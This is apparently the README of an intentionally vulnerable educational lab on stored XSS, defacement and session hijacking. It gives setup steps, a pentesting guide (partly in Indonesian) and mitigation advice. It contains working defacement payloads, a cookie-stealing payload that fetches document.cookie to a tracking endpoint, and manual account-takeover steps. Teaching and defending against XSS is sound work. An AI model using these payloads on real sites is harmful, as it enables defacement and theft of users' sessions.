# XSS & Defacement Demo Lab

A realistic web application demonstrating Stored Cross-Site Scripting (XSS), Defacement, and Cookie Stealing vulnerabilities. This project is for **educational purposes only**.

## Features

- **Realistic Blog Interface**: No artificial "Vulnerability Detected" warnings. Looks like a standard blog.
- **Vulnerable Backend (Express + SQLite)**: Stores raw user input to demonstrate Stored XSS.
- **Security Modes**:
    - **VULNERABLE**: Input is stored raw and rendered with `dangerouslySetInnerHTML`.
    - **SAFE**: Input is sanitized (HTML encoded) before storage.
- **Attack Scenarios**:
    - **Defacement**: Injecting CSS to change the site appearance.
    - **Cookie Stealing**: Exfiltrating session cookies to an attacker server.

## Installation & Running

### 1. Backend (Server)
The backend runs on port 3001 and handles the database and API.

```bash
cd server
npm install
# Start the server (Default is VULNERABLE mode)
node index.js
```

To run in **SAFE MODE**:
```bash
# Linux/Mac
export SECURITY_MODE=SAFE && node index.js
# Windows (Cmd)
set SECURITY_MODE=SAFE && node index.js
# Windows (PowerShell)
$env:SECURITY_MODE="SAFE"; node index.js
```

### 2. Frontend (Client)
The frontend runs on port 3000 (proxies API requests to 3001).

```bash
# In the root directory
pnpm install
pnpm dev
```

Open [http://localhost:3000](http://localhost:3000) in your browser.

---

## Pentesting Guide

### Phase 1: Reconnaissance
Identify where user input is reflected on the page. In this app, the **Comment Section** reflects input from users.

### Phase 2: Exploitation

#### Scenario A: Defacement (Stored XSS)
Goal: Change the visual appearance of the website for all users.

**Payload:**
```html
<style>
  body { background-color: black !important; filter: invert(1); }
  h1 { color: red !important; }
</style>
<div style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999; background:black; color:red; display:flex; justify-content:center; align-items:center; list-style:none;">
  <h1>HACKED BY ANONYMOUS</h1>
</div>
```

```html
document.title='💀 HACKED BY ETHICAL PENTESTER 💀'; 
document.body.innerHTML=`
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;
              background:linear-gradient(45deg, black, red, black);
              color:lime;display:flex;flex-direction:column;
              align-items:center;justify-content:center;
              font-family:Courier New,monospace;z-index:99999;
              animation:pulse 1s infinite;">
    <div style="font-size:4rem;text-shadow:0 0 20px lime;margin-bottom:20px;">
      💀 SYSTEM COMPROMISED 💀
    </div>
    <div style="font-size:1.5rem;margin-bottom:20px;">
      Website Telah Diretas!
    </div>
  </div>
`;

```
1. Submit this payload in a comment.
2. Refresh the page. The style persists because it's stored in the database.

#### Scenario B: Cookie Stealing & Account Takeover (Session Hijacking)
Goal: Steal the session cookie of an authenticated user and use it to takeover their account.

**Prerequisites:**
1. **User (Victim)**: Accesses the main website (`http://localhost:3000`).
2. **Attacker**: Accesses the Attacker Dashboard (`[ Attacker Dashboard ]` link in footer).

**Step-by-Step Attack:**

1.  **Setup Victim (Simulate Normal User)**:
    -   Go to the main site.
    -   Click **Login** in the Navbar (Username: `admin`, Password: `password`).
    -   Verify you see "Hello, admin" in the Navbar. This means your browser now holds a sensitive `session_id` cookie.

2.  **Setup Attacker**:
    -   Open a **Tab Baru / Jendela Incognito** (anggap ini komputer hacker).
    -   Buka website yang sama, tapi jangan Login.
    -   Scroll ke paling bawah (footer), klik link merah **[ Attacker Dashboard ]**.
    -   Halaman ini akan menunggu data curian masuk.

3.  **Authentication & Injection (The Trap)**:
    -   Kembali ke **Tab Korban**.
    -   Buka artikel apa saja.
    -   Tulis komentar dengan payload XSS berikut:
        ```html
        <img src=x onerror="fetch('/api/track?cookie='+document.cookie)">
        ```
    -   *Penjelasan Payload*: Script ini akan mencoba meload gambar palsu. Saat gagal (`onerror`), ia akan mengirim request ke server penyerang (`/api/track`) dengan membawa `document.cookie` milik korban.

4.  **Capture Credentials**:
    -   Buka **Tab Attacker**.
    -   Lihat log baru muncul di dashboard! Anda akan melihat IP korban dan Cookie mereka (`session_id=...`).

5.  **Account Takeover (The Hack)**:
    -   **Cara Otomatis (Demo)**: Klik tombol **IMPERSONATE VICTIM** di dashboard. Browser penyerang akan memaksa set cookie sesuai data curian.
    -   **Cara Manual (Real World)**:
        1.  Copy value cookie dari dashboard (misal: `secret_session_token_12345`).
        2.  Buka Developer Tools (F12) -> tab **Application** (Chrome/Edge) atau **Storage** (Firefox).
        3.  Pilih **Cookies** -> `http://localhost:3000`.
        4.  **Cari cookie `session_id`**.
            -   *Jika Tidak Ada*: Klik baris kosong paling bawah (atau klik kanan > Add Item).
            -   Isi **Name**: `session_id`
            -   Isi **Value**: Paste value curian tadi.
        5.  Refresh halaman.
    -   **Hasil**: Refresh halaman Attacker. Navbar sekarang menampilkan **"Hello, admin"**. Anda telah berhasil mengambil alih akun tanpa mengetahui passwordnya!

---

## Prevention & Mitigation

### 1. Input Sanitization (Primary Defense)
Never trust user input. Convert special characters to HTML entities before determining their context.
- **Vulnerable Code**: `stmt.run(author, text)` (Directly saving raw text).
- **Secure Code**: `stmt.run(escapeHtml(author), escapeHtml(text))`
  - `<` becomes `&lt;`
  - `>` becomes `&gt;`
  - `"` becomes `&quot;`

### 2. Output Encoding
Even if bad data is in the DB, encode it when displaying.
- **React Vulnerability**: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`
- **React Security**: `<div>{comment.text}</div>` (React does this by default).

### 3. HttpOnly Cookies
Prevent JavaScript from accessing sensitive cookies.
- **Insecure**: `res.cookie('session_id', '...', { httpOnly: false })`
- **Secure**: `res.cookie('session_id', '...', { httpOnly: true })`
  - With `HttpOnly`, `document.cookie` returns an empty string for that cookie, defeating the theft payload.

### 4. Content Security Policy (CSP)
A HTTP header that restricts where resources (scripts, images, styles) can be loaded from.
- Example: `Content-Security-Policy: default-src 'self'; script-src 'self'` would block inline scripts and fetches to external domains.